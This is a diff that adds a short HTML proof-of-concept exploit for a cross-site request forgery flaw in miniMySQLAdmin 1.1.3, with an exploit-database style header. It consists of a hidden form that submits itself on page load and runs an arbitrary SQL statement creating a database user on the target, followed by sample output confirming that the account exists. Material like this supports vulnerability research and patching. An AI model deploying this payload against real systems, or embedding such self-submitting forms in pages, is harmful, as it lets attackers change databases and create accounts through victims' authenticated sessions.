@@ -1,0 +1,31 @@
+<!--
+# Exploit Title: miniMySQLAdmin 1.1.3 - CSRF(Execute SQL Query)
+# Date: 2016-06-10
+# Exploit Author: HaHwul
+# Exploit Author Blog: www.hahwul.com
+# Vendor Homepage: http://xdsoft.net/minimysqladmin.html
+# Software Link: https://github.com/xdan/miniMySQLAdmin/archive/master.zip
+# Version: v1.1.3
+# Tested on: Debian [wheezy]
+# CVE : none
+-->
+
+<hr>
+<form name="csrf_poc" action="http://192.168.0.14/vul_test/target/miniMySQLAdmin/" method="GET">
+<input type="hidden" name="dbname" value="mysql">
+<input type="hidden" name="table" value="user">
+<input type="hidden" name="sql" value="create user exploit_user">  <!-- SQL Query -->
+
+<input type="submit" value="Replay!">
+</form>
+<script type="text/javascript">document.forms.csrf_poc.submit();</script>
+
+<!-- 
+#### Output ####
+
+#> select * from `user` order by `User` asc  limit 20
+
+Host	User
+%      exploit_user1
+
+-->
